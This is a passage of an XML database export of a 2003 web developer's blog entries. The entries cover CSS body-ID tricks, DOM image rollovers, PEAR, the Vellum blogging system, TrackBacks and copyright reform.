&lt;li&gt;&lt;a href=&quot;http://www.steptwo.com.au/papers/cmb_needcms/index.html&quot;&gt;Why every website needs a CMS&lt;/a&gt; is a short but sweet introduction to content management for small site owners.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;One thing that I think is missing from the metadata article (probably because it is so obvious) is the importance of the availability of a good title for each piece of content. When I started this blog I chose not to use post titles as I wanted entries to stand together on the day they were posted rather than existing as completely unique entities. When I later changed my comments system to avoid popup windows I was forced to make entries available on their own page anyway, with the lack of titles forcing me to title the page with the date of the entry rather than something more explicit. Further more, when I finally get around to implementing a search engine I will probably be forced to return entire entries in the results rather than just a relevant extract thanks to the lack of a title to display on the results page.&lt;/p&gt;

&lt;p&gt;As always, &lt;a href=&quot;http://diveintomark.org/&quot;&gt;Mark Pilgrim&lt;/a&gt; provides an excellent example by adding both titles and abstracts (mentioned by James in his metadata article) to hist posts and serving them up with the search results. I don't think I have the energy to go back over all my old posts and add abstracts but some day I'm going to have to go back and add titles (probably adapting most of them from the permalink almost-titles I have already). But not today. Today I'm revising Lamda Calculus.&lt;/p&gt;</field>
		<field name="created">2003-01-15 11:11:35</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">711</field>
		<field name="title">Aww crap</field>
		<field name="slug">awwCrap</field>
		<field name="body">&lt;p&gt;Aww &lt;a href=&quot;http://cyberlaw.stanford.edu/lessig/blog/archives/2003_01.shtml#000860&quot; title=&quot;with deep sadness&quot;&gt;crap&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-01-15 17:09:40</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">712</field>
		<field name="title">Feedback loops</field>
		<field name="slug">feedbackLoops</field>
		<field name="body">&lt;p&gt;Mark Pilgrim has been having &lt;a href=&quot;http://www.intertwingly.net/blog/1123.html#c1042651053&quot; title=&quot;Sam Ruby: Are My Ears Ringing?&quot;&gt;an interesting problem&lt;/a&gt; with his Further Reading feature: Feedback loops.&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.intertwingly.net/blog/1123.html#c1042651053&quot;&gt;&lt;p&gt;
I always said that my &quot;further reading&quot; was like a prisoner's dilemma: great for me as long as nobody else did it. Once everybody's doing it, the feedback loops start and the signal-to-noise ratio skyrockets and it becomes worthless.
&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2003-01-15 17:26:10</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">713</field>
		<field name="title">PEAR out of beta</field>
		<field name="slug">pearOutOfBeta</field>
		<field name="body">&lt;p&gt;I just noticed that &lt;acronym title=&quot;PHP Extension and Application Repository&quot;&gt;PEAR&lt;/acronym&gt; is finally out of beta. This means that the PEAR installer will be included with &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; 4.3, but more importantly it means that the &lt;a href=&quot;http://pear.php.net/&quot;&gt;PEAR website&lt;/a&gt; finally has a usable navigation system.&lt;/p&gt;</field>
		<field name="created">2003-01-15 23:52:00</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">714</field>
		<field name="title">Fun with body IDs</field>
		<field name="slug">funWithBodyIds</field>
		<field name="body">&lt;p&gt;Mark has &lt;a href=&quot;http://diveintomark.org/archives/2003/01/16.html#body_ids&quot; title=&quot;body IDs&quot;&gt;hit on the clever idea&lt;/a&gt; of using the &lt;code&gt;body&lt;/code&gt; tag's &lt;code&gt;id&lt;/code&gt; attribute to apply different styles to different pages all from the same stylesheet. The technique is very neat, but it would be even neater if he combined it with Eric Meyer's &lt;a href=&quot;http://archivist.incutio.com/css-discuss/?id=13291&quot;&gt;CSS Signatures&lt;/a&gt; to allow advanced users to specify their own styles for his site. Since the ID attribute can't be overloaded with more than one value doing so would probably mean having to use the &lt;code&gt;body&lt;/code&gt; tag's &lt;code&gt;class&lt;/code&gt; attribute as well - the &lt;code&gt;id&lt;/code&gt; attribute could hold the signature while the class attribute specified the page (or vice versa).&lt;/p&gt;</field>
		<field name="created">2003-01-16 22:03:24</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">715</field>
		<field name="title">Who needs web standards?</field>
		<field name="slug">whoNeedsWebStandards</field>
		<field name="body">&lt;p&gt;Aquarion &lt;a href=&quot;http://www.aquarionics.com/journal/id/955&quot; title=&quot;We&amp;apos;ve struck pure moron&quot;&gt;points out&lt;/a&gt; a truly moronic &quot;browser upgrade&quot; notice. I especially like &lt;q cite=&quot;http://www.aquarionics.com/journal/id/955&quot;&gt;Anything larger than 800 x 600 is too large, and the pages do not diosplay [sic] properly&lt;/q&gt;.&lt;/p&gt;</field>
		<field name="created">2003-01-16 22:07:08</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">716</field>
		<field name="title">Vellum looks nice</field>
		<field name="slug">vellumLooksNice</field>
		<field name="body">&lt;p&gt;Stuart has released the code for &lt;a href=&quot;http://www.kryogenix.org/code/vellum/&quot;&gt;Vellum&lt;/a&gt;, his new Python blogging system. I haven't tried it out yet (the installation process is pretty in depth and I don't have a properly configured server to hand) but it looks damn sexy. Key features include:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Funky caching - an idea that originated with Rasmus Lerdorf that was expanded on by Phil Ringnalda &lt;a href=&quot;http://philringnalda.com/archives/002388.php&quot; title=&quot;Half-baked and a little fried&quot;&gt;a while ago&lt;/a&gt; (I blogged it &lt;a href=&quot;http://simon.incutio.com/archive/2002/11/16/#funkyCachingExplained&quot; title=&quot; Archive for 16th November 2002&quot;&gt;here&lt;/a&gt;) where pages are intelligently created by a custom 404 script as and when they are first requested.&lt;/li&gt;
&lt;li&gt;A template system based on Stuart's &lt;a href=&quot;http://www.kryogenix.org/code/castalian/&quot;&gt;Castalian&lt;/a&gt; engine, which allows Python to be embedded in &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; using a similar approach to &lt;acronym title=&quot;Active Server Pages&quot;&gt;ASP&lt;/acronym&gt;. The template system includes the interesting addition of an 'end' statement for Python blocks, to get around the problem of Python's indentation clashing with the indentation used in the &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt;  of the templates.&lt;/li&gt;
&lt;li&gt;A truly smart looking &lt;a href=&quot;http://www.kryogenix.org/code/vellum/docs/plugins.html&quot;&gt;Plugins system&lt;/a&gt;, with plugins that can either extend existing Vellum objects (adding new methods and attributes if required) or use 'hooks' to add new functionality to the existing code structure. Best of all, plugin installation is as simple as dropping a plugin file in to a directory.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;All in all it looks like a really smart system. It's going to be fun watching it evolve (comments are promised as a soon-to-be-added feature).&lt;/p&gt;</field>
		<field name="created">2003-01-16 22:19:12</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">717</field>
		<field name="title">Blogging with AppleScript</field>
		<field name="slug">appleScriptBlogging</field>
		<field name="body">&lt;p&gt;Les Orchard &lt;a href=&quot;http://www.decafbad.com/news_archives/000383.phtml&quot; title=&quot;Folder Actions + AppleScript = Desktop Blogging&quot;&gt;describes&lt;/a&gt; an intriguing blogging tool built with AppleScript that posts links to a weblog when they are dragged on to a special folder on the OS X desktop.&lt;/p&gt;</field>
		<field name="created">2003-01-16 22:29:17</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">718</field>
		<field name="title">Copy wrongs</field>
		<field name="slug">copyWrongs</field>
		<field name="body">&lt;p&gt;A &lt;a href=&quot;http://randomfoo.net/?p=2003_01_12_archive.inc#90200986&quot; title=&quot;random($foo): Friday, January 17, 2003&quot;&gt;top notch rant&lt;/a&gt; from Leonard Lin:&lt;/p&gt;
&lt;blockquote cite=&quot;http://randomfoo.net/?p=2003_01_12_archive.inc#90200986&quot;&gt;&lt;p&gt;
Often times, I like to think of these little thought experiments. Imagine the inventor of the wheel, or of stone cutting implements getting and enforcing a patent. Or perhaps the English language being under the modern notion of 'copyright'. Where would we be today? We won't have to wait long to find out I suspect. Our society seems perfectly fine with the unlimited expansion, in both breadth and length, of 'intellectual property'.
&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2003-01-18 12:48:11</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">719</field>
		<field name="title">Colour blindness filter</field>
		<field name="slug">colourBlindnessFilter</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://www.anitrapavka.com/weblog/2003/01.html#14&quot;&gt;Anitra Pavka&lt;/a&gt; (who has an excellent &lt;a href=&quot;http://www.anitrapavka.com/&quot;&gt;usability and accessibility weblog&lt;/a&gt;): &lt;a href=&quot;http://colorfilter.wickline.org/colorblind/filter/&quot;&gt;Colourblind Web Page Filter&lt;/a&gt;, a clever server driven tool which shows how web pages would look to people suffering from three different forms of colour blindness.&lt;/p&gt;</field>
		<field name="created">2003-01-18 12:58:55</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">720</field>
		<field name="title">PEAR templates and bitshifting</field>
		<field name="slug">pearTemplatesAndBitshifting</field>
		<field name="body">&lt;p&gt;Codewalker.com have &lt;a href=&quot;http://codewalkers.com/tutorials/36/1.html&quot; title=&quot;How to use the PEAR ITX templating system&quot;&gt;a tutorial&lt;/a&gt; up describing &lt;acronym title=&quot;PHP Extension and Application Repository&quot;&gt;PEAR&lt;/acronym&gt;'s ITX template system. Their forums also have an &lt;a href=&quot;http://codewalkers.com/forum/index.php?action=displaythread&amp;amp;forum=php-contest&amp;amp;id=357&amp;amp;realm=default&quot;&gt;explanation of how bitshifting operators work&lt;/a&gt; in &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; (in the fifth message from the bottom of the thread).&lt;/p&gt;</field>
		<field name="created">2003-01-18 13:04:58</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">721</field>
		<field name="title">Spam conference</field>
		<field name="slug">spamConference</field>
		<field name="body">&lt;p&gt;It sounds like Paul Graham's Spam Conference was a huge success, with attendance rocketing to 560 from the original estimate of 50 - 60. Scott Johnson &lt;a href=&quot;http://radio.weblogs.com/0103807/2003/01/18.html#a1226&quot; title=&quot;Spam Conference Trip Report&quot;&gt;sings its praise&lt;/a&gt; and promises a full write up later on. In the meantime, webcasts of the talks are available on the &lt;a href=&quot;http://www.spamconference.org/&quot; title=&quot;Spam Conference&quot;&gt;conference website&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-01-18 16:23:25</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">722</field>
		<field name="title">The Eric Eldred act</field>
		<field name="slug">theEricEldredAct</field>
		<field name="body">&lt;p&gt;Larry Lessig has a new campaign: a &quot;copyright tax&quot; that kicks in 50 years in to a copyright term, demanding copyright owners to pay a nominal fee ($1 - $50) to maintain control of their copyright. Unused works that are no longer profitable should then default to falling in to the public domain, while more commercial works can stay copyrighted. Larry's idea was first announced in this &lt;a href=&quot;http://www.nytimes.com/2003/01/18/opinion/18LESS.html?ex=1043470800&amp;amp;en=97d153dccaa9d220&amp;amp;ei=5007&amp;amp;partner=USERLAND&quot; title=&quot;Protecting Mickey Mouse at Art&amp;apos;s Expense&quot;&gt;New York Times Op-Ed&lt;/a&gt; and is also covered on &lt;a href=&quot;http://cyberlaw.stanford.edu/lessig/blog/archives/2003_01.shtml#000882&quot; title=&quot;on building rather than suing: The Eric Eldred Act&quot;&gt;Lessig's blog&lt;/a&gt;. He has also published an &lt;a href=&quot;http://cyberlaw.stanford.edu/lessig/blog/archives/EAFAQ.html&quot; title=&quot;The Eric Eldred Act FAQ&quot;&gt;FAQ&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-01-18 16:29:02</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">723</field>
		<field name="title">Better image rollovers</field>
		<field name="slug">betterImageRollovers</field>
		<field name="body">&lt;p&gt;When browsing through other site's source code, some of the ugliest &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; occurs when the site uses one of the most basic javascript effects: The image rollover. There are a &lt;a href=&quot;http://www.google.com/search?q=javascript+image+rollover&quot; title=&quot;Google Search: javascript image rollover&quot;&gt;myriad of these scripts available&lt;/a&gt; for free on the web, but as far as I can tell every single one of them requires event handling code to be added to the markup of the page.&lt;/p&gt;

&lt;p&gt;In these days of standards, the &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt; and separating structure from presentation this is no longer good enough. Image rollovers are a presentational nicety - they add nothing to the underlying meaning of the document and as such I see no reason to pollute my markup with code to support them. I'm always on the lookout for fun new ways to use the &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt; (see &lt;a href=&quot;http://simon.incutio.com/archive/2002/12/20/#blockquoteCitations&quot;&gt;blockquote citations&lt;/a&gt;) so I took it upon myself to improve the situation. The first iteration of my improved rollover script, &lt;a href=&quot;/js/rollovers.js&quot;&gt;rollovers.js&lt;/a&gt;, is &lt;a href=&quot;/js/rollovers.html&quot; title=&quot;rollovers.js: Image rollovers with CSS and the DOM&quot;&gt;demonstrated here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The approach I have taken is to give any images that are to have a rollover a &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; defined background image and a class attribute of &quot;rollover&quot;. The &lt;code&gt;rollovers.js&lt;/code&gt; script then finds all images with that class name and adds onmouseover and onmouseout events to them (using Scott Andrew's &lt;a href=&quot;http://www.scottandrew.com/weblog/jsjunk#events&quot;&gt;addEvent function&lt;/a&gt; to avoid cross browser incompatibilities). When an image is rolled over, the image is replaced with a preloaded transparent gif allowing the background image to show through. The gif is switched back to the default image when the mouse moves away.&lt;/p&gt;

&lt;p&gt;The script works fine in Mozilla 1.2, Phoenix 0.5 and &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;6. It fails in Opera 7, thanks I think to problems dynamically adding new events in that browser. I would love to hear if it works in other browsers, especially Mac browsers such as &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; 5 and Safari. Any suggestions on further improvements to the script would also be very welcome.&lt;/p&gt;</field>
		<field name="created">2003-01-19 11:46:38</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">724</field>
		<field name="title">Alternative rollover script</field>
		<field name="slug">alternativeRolloverScript</field>
		<field name="body">&lt;p&gt;And here's Daniel Nolan's &lt;a href=&quot;http://www.bleedingego.co.uk/code/js/rollover/&quot;&gt;standards compliant rollover script&lt;/a&gt;, which uses a different approach (based on rollover images using a standard naming convention with a suffix attached to the name of the original image) but achieves the same effect, working in Opera 7 as well. It also uses a neat way of adding events using javascript function prototypes.&lt;/p&gt;</field>
		<field name="created">2003-01-19 13:11:07</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">725</field>
		<field name="title">Pythonology</field>
		<field name="slug">pythonology</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://pythonology.org/&quot;&gt;Pythonology&lt;/a&gt; (via &lt;a href=&quot;http://www.deadlybloodyserious.com/Python/2003/01/16.html#a1061&quot; title=&quot;Pythonology: Python advocacy site&quot;&gt;Deadly Bloody Serious about Python&lt;/a&gt;) is a Python advocacy site aimed at software engineers and managers. The site has a fantastic collection of case studies, &lt;a href=&quot;http://pythonology.org/success/&quot;&gt;Python Success Stories&lt;/a&gt;, which an &lt;a href=&quot;http://pythonology.org/success&amp;amp;story=rackspace&quot; title=&quot;Python is Rackspace&amp;apos;s CORE Technology&quot;&gt;interesting piece&lt;/a&gt; describing why and how Rackspace migrated their main enterprise data system from &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; to Python.&lt;/p&gt;</field>
		<field name="created">2003-01-19 17:47:12</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">726</field>
		<field name="title">Recursive how?</field>
		<field name="slug">recursiveHow</field>
		<field name="body">&lt;p&gt;I just can't figure out how &lt;a href=&quot;http://www.mantasoft.co.uk/_stuff/Recursive.htm&quot;&gt;Recursive&lt;/a&gt; was made.&lt;/p&gt;</field>
		<field name="created">2003-01-19 17:48:17</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">727</field>
		<field name="title">A global conversation</field>
		<field name="slug">aGlobalConversation</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://scriptingnews.userland.com/backissues/2003/01/19#When:10:50:42AM&quot; title=&quot;Scripting News: Sunday, January 19, 2003&quot;&gt;Dave Winer&lt;/a&gt; on TrackBacks and push backs (and presumably &lt;a href=&quot;http://www.hixie.ch/specs/pingback/pingback&quot;&gt;PingBack&lt;/a&gt; as well):&lt;/p&gt;

&lt;blockquote cite=&quot;http://scriptingnews.userland.com/backissues/2003/01/19#When:10:50:42AM&quot;&gt;&lt;p&gt;
I'm old school. I think the cool thing about weblogs is that they are not discussion groups or mail lists. If I want to know what all the people are saying there are ways to do that, but very often I'm content to read email and a few weblogs that I trust. Personally I don't think there's gold in them thar hills, but of course I've been wrong before.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;I think Dave has missed the boat on this one by a long way. Just the other day I realised that weblogs (or at least the one's I read) are essentially a huge global conversation. Anyone can join in, but the price of entry is having your own blog and something interesting to say. With those two pre-requisites the social network of the blogosphere does the rest - people will see what you have to say via random browsing, links on other blogs, TrackBack return links and so forth and before you know it your (useful) opinion will be being read by people who normally you wouldn't communicate with in your entire lifetime.&lt;/p&gt;

&lt;p&gt;Mark Pilgrim knows this, and his &lt;a href=&quot;http://diveintomark.org/projects/recommended_reading/&quot;&gt;Recommended Reading&lt;/a&gt; and &lt;a href=&quot;http://diveintomark.org/archives/2002/04/20.html#automatic_linkbacks&quot;&gt;Automatic Linkback&lt;/a&gt; tools provide him with an excellent way of participating in the global conversation. Dave Winer, as a contrast, appears to treat his blog as read-only - no comments, no trackbacks. There's nothing wrong with this (how someone runs their blog is a very personal thing) but I can't help but think that by doing so Dave is missing out on a truly remarkable example of the two way web in action.&lt;/p&gt;

&lt;p&gt;So that's my rant. Unfortunately, seeing as I'm unlikely to feature on Dave's &quot;few weblogs&quot; that he trusts the chances are he'll never read it. Çe la vie.&lt;/p&gt;</field>
		<field name="created">2003-01-19 22:26:40</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">728</field>
		<field name="title">You know me</field>
		<field name="slug">youKnowMe</field>
		<field name="body">&lt;p&gt;Dave Winer: &lt;a href=&quot;http://www.thetwowayweb.com/stories/storyReader$252&quot;&gt;The &quot;You Know Me&quot; Button&lt;/a&gt;. Dave hates posting comments on blogs and then having to check back constantly to see if anyone has replied (I do too). Sam Ruby's &lt;a href=&quot;http://www.intertwingly.net/blog/1135.html&quot; title=&quot;Subscribing to comments&quot;&gt;solution&lt;/a&gt; is to provide the comments as a separate RSS feed for each of his entries, but Dave wants something more automatic that won't clog up his aggregator. Dave's new proposal is intruiging to say the least. When you sign up for an account with a discussion forum you have the option of configuring a link to an &quot;identity server&quot; able to respond to a specific protocol. Once this has been done, the discussion software &quot;pings&quot; your identity server with your username and a message whenever someone responds to one of your posts.&lt;/p&gt;

&lt;p&gt;The idea as it stands is great, but at the moment it fails to address discussion forums that do not require the user to create an account (many blog comment systems for example). These could probably be served by a single text field asking for your optional You-Know-Me address. The problem that arises then is that of authentication - what's to stop someone maliciously signing you up for comment threads without your consent? The spectre of spam can't be too far over the horizon.&lt;/p&gt;

&lt;p&gt;Maybe a solution would be to turn subscription in to a two-step process - first you tell the comment thread your details and have it ping your identity server, then later on you visit the web application running on the identity server and &quot;approve&quot; that subscription. That should defend against unwanted subscriptions, but it also adds another layer of complexity to what should be an automatic process. You would also have to do this for every unauthenticated thread you subscribed to (I imagine that authenticated account based subscriptions such as the ones Dave describes in his initial article would handl auto-subscribing you to all threads you participate in).&lt;/p&gt;

&lt;p&gt;I have no doubt that someone will come up with solutions to any issues with Dave's system, and I look forward to seeing the spec develop. Once a basic protocol has been laid down the possibilities are huge - I-Know-You to RSS/email/Jabber gateways are an obvious extension that could be great fun to hack around with. It's been a while since I've messed around with web services and my &lt;a href=&quot;http://scripts.incutio.com/xmlrpc/&quot; title=&quot;The Incutio XML-RPC Library&quot;&gt;XML-RPC library&lt;/a&gt; could do with an update.&lt;/p&gt;</field>
		<field name="created">2003-01-20 23:19:36</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">729</field>
		<field name="title">Scaling the two way web</field>
		<field name="slug">scalingTheTwoWayWeb</field>
		<field name="body">&lt;p&gt;Another &lt;a href=&quot;http://www.scripting.com/&quot;&gt;Dave&lt;/a&gt; inspired post: It seems I misunderstood Dave's objections to blogging feedback mechanisms &lt;a href=&quot;http://simon.incutio.com/archive/2003/01/19/#aGlobalConversation&quot; title=&quot;A Global Conversation&quot;&gt;yesterday&lt;/a&gt;. I thought he was ruling out what I see as an invaluable tool for low traffic bloggers, but in fact his main complaint was that things like comments / TrackBacks and so forth simply don't &lt;em&gt;scale&lt;/em&gt;. Mark Pilgrim &lt;a href=&quot;http://simon.incutio.com/archive/2003/01/19/aGlobalConversation#comments&quot; title=&quot;A Global Conversation: Comments&quot;&gt;echos his complaints&lt;/a&gt;, pointing out how overwhelmed his blog was with auto-linkbacks from his Safari review. l.m.orchard &lt;a href=&quot;http://www.decafbad.com/news_archives/000390.phtml&quot; title=&quot;Automated openness versus the script kiddies&quot;&gt;concurrs&lt;/a&gt;: &lt;q cite=&quot;http://www.decafbad.com/news_archives/000390.phtml&quot;&gt;At present, I'm safe. My rating is Mostly Harmless, so all my open systems are mostly free from abuse. But, the first time I really strike a nerve somewhere, I'm a sitting duck.&lt;/q&gt;&lt;/p&gt;

&lt;p&gt;So is it possible to stay open while maintaining a super high traffic site? Slashdot's &lt;a href=&quot;http://slashdot.org/faq/com-mod.shtml&quot; title=&quot;Slashdot FAQs: Comments and Moderation&quot;&gt;moderation system&lt;/a&gt; has had a huge amount of effort put in to it but most of the discussions still devolve in to all out flames with useful comments failing to rise out of the morass. Trust metric is an interesting concept where user's boost each other's reliability ratings (the best implementation I've seen of this is &lt;a href=&quot;http://www.advogato.org/trust-metric.html&quot; title=&quot;Advogato&amp;apos;s trust metric&quot;&gt;Advogato&lt;/a&gt;) but such a system does not readily map to blogs where authentication systems are mostly non-existent - besides, a system based on who knows who will exclude the outside voices that we have already established may have interesting things to say.&lt;/p&gt;

&lt;p&gt;I guess scaling the two way web is what my Software Engineering lecturers would call a &quot;&lt;a href=&quot;http://www.unidata.ucar.edu/staff/caron/collab/wicked.html&quot; title=&quot;Wicked Problems, found via a quick Google&quot;&gt;wicked problem&lt;/a&gt;&quot;.&lt;/p&gt;</field>
		<field name="created">2003-01-20 23:38:42</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">730</field>
		<field name="title">Stylesheet parsing gets complicated</field>
		<field name="slug">stylesheetParsingGetsComplicat</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.saila.com/columns/lcky/index.shtml?2003_01_19_archive.shtml#87745517&quot; title=&quot;Saila.com: Monday, January 20, 2003&quot;&gt;Craig Saila&lt;/a&gt; points to the SearchEngineWatch &lt;a href=&quot;http://www.searchengineworld.com/cgi-bin/page_size.cgi&quot;&gt;Webpage Size Checker&lt;/a&gt;. It's a nice tool, but it doesn't appear to take the size of linked style sheets in to account. I was playing around with the idea of a web page cache written in Python over Christmas and I hit the same kind of problem - while finding linked stylesheets using Python's &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; parser wasn't too difficult (and could be achieved equally well using a regular expression) things get a lot hairier when you start to take &lt;code&gt;@import&lt;/code&gt; statements and &lt;acronym title=&quot;Cascading Style Sheet&quot;&gt;CSS&lt;/acronym&gt; defined background images / custom bullet images in to account. Again I imagine a solution could be hacked out with regular expressions but a nicer method would be some kind of &lt;acronym title=&quot;Cascading Style Sheet&quot;&gt;CSS&lt;/acronym&gt; parser (the Python standard library has yet to include one). Maybe another project for a rainy day...&lt;/p&gt;</field>
		<field name="created">2003-01-20 23:50:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">731</field>
		<field name="title">More Vellum</field>
		<field name="slug">moreVellum</field>
		<field name="body">&lt;p&gt;Vellum 1.0a4 is &lt;a href=&quot;http://www.kryogenix.org/code/vellum/&quot; title=&quot;Vellum: a weblogging system in Python&quot;&gt;out&lt;/a&gt;, and features comment support via a new Comments plugin and an Audience generic object type that abstracts the concept of &quot;responses to your post&quot; and is also used for Pingback support. Different response types within the same interface is a very neat idea, as Sam Ruby has &lt;a href=&quot;http://www.intertwingly.net/blog/1136.html&quot; title=&quot;Pingback now with excerpts&quot;&gt;demonstrated&lt;/a&gt; with his integrated comments, referral tracking, Pingbacks and TrackBacks. Stuart also &lt;a href=&quot;http://www.kryogenix.org/days/383.html&quot; title=&quot;Comment pings&quot;&gt;suggests&lt;/a&gt; auto-discovery of You-Know-Me information from the &lt;acronym title=&quot;Uniform Resource Locator&quot;&gt;URL&lt;/acronym&gt; of your weblog, presumably by another &lt;code&gt;link&lt;/code&gt; element. This is a great idea, but I have reservations about the performance trade off as unauthenticated comment systems will have to retrieve the poster's home page in the background every time they make a post.&lt;/p&gt;</field>
		<field name="created">2003-01-21 11:14:58</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">732</field>
		<field name="title">More body ID fun</field>
		<field name="slug">moreBodyIdFun</field>
		<field name="body">&lt;p&gt;Scott Andrew points out &lt;a href=&quot;http://www.scottandrew.com/weblog/2003_01#a000501&quot; title=&quot;More On BODY IDs&quot;&gt;another smart trick&lt;/a&gt; with body tag ID attributes - selectively showing and hiding navigation elements depending on the current page. This is a really neat idea, but it does lead to a blurring of the lines between structure and presentation - if a navigation section isn't relevant to a particular page this should be mirrored in the markup rather than worked around by the &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;. That said, there are some nice presentational touches which could be achieved with this technique without sacrificing structural purity, such as highlighting the navigation menu item for the current page in a different colour:&lt;/p&gt;

&lt;pre&gt;
body#aboutpage li#aboutlink {
  background-color: red;
  color: white;
}

&amp;lt;body id=&quot;aboutpage&quot;&amp;gt;
...
&amp;lt;ul class=&quot;subnav&quot;&amp;gt;
 &amp;lt;li id=&quot;newslink&quot;&amp;gt;&amp;lt;a href=&quot;/news/&quot;&amp;gt;News&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
 &amp;lt;li id=&quot;aboutlink&quot;&amp;gt;&amp;lt;a href=&quot;/about/&quot;&amp;gt;About&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
 &amp;lt;li id=&quot;contactlink&quot;&amp;gt;&amp;lt;a href=&quot;/contact/&quot;&amp;gt;Contact&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
&amp;lt;/ul&amp;gt;
...
&amp;lt;/body&amp;gt;
&lt;/pre&gt;

&lt;p&gt;But then I suppose you could argue that the link to the current page shouldn't be a link at all.&lt;/p&gt;</field>
		<field name="created">2003-01-21 21:19:58</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">733</field>
		<field name="title">Anil Dash on diamonds</field>
		<field name="slug">anilDashOnDiamonds</field>
		<field name="body">&lt;p&gt;Anil Dash: &lt;a href=&quot;http://www.dashes.com/anil/index.php?archives/004817.php&quot;&gt;Diamonds are for never&lt;/a&gt;. A thoroughly entertaining and educating rant about the Diamond industry. Some day I hope to be this articulate.&lt;/p&gt;</field>
		<field name="created">2003-01-21 21:26:33</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">734</field>
		<field name="title">DOM support tables</field>
		<field name="slug">domSupportTables</field>
		<field name="body">&lt;p&gt;PPK's ever excellent &lt;a href=&quot;http://www.xs4all.nl/~ppk/js/&quot;&gt;JavaScript Section&lt;/a&gt; now features updated &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt; compatibility tables for &lt;a href=&quot;http://www.xs4all.nl/~ppk/js/index.html?w3c_core.html&quot;&gt;W3C Core&lt;/a&gt; and &lt;a href=&quot;http://www.xs4all.nl/~ppk/js/index.html?w3c_html.html&quot;&gt;W3C HTML&lt;/a&gt;. The tables contain detailed descriptions of suport for &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt; features in &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; 5 and 6 for Windows, &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; for Mac, Mozilla 1.2, Safari 1.0 Beta, Opera 7 Beta and iCab 2.8.2. I've been playing around with the &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt; quite a lot recently and the differences between &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; and Mozilla were driving me up the wall - I only wish I'd found this fantastic resource sooner.&lt;/p&gt;

&lt;p&gt;PPK's &lt;a href=&quot;http://www.xs4all.nl/~ppk/js/index.html?innerhtml.html&quot;&gt;W3C DOM vs. innerHTML&lt;/a&gt; demonstration is interesting as well - it compares the performance of the &lt;acronym title=&quot;World Wide Web Consortium&quot;&gt;W3C&lt;/acronym&gt; and Microsoft's widely supported innerHTML extension for generating large amounts of new page content.&lt;/p&gt;

&lt;p&gt;Found via PPK, this &lt;a href=&quot;http://www.twinhelix.com/dhtml/scripts/jsobj.html&quot;&gt;Object Model Browser&lt;/a&gt; is a nice tool for browsing around the available &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt; properties and methods in different browsers.&lt;/p&gt;</field>
		<field name="created">2003-01-22 11:25:35</field>
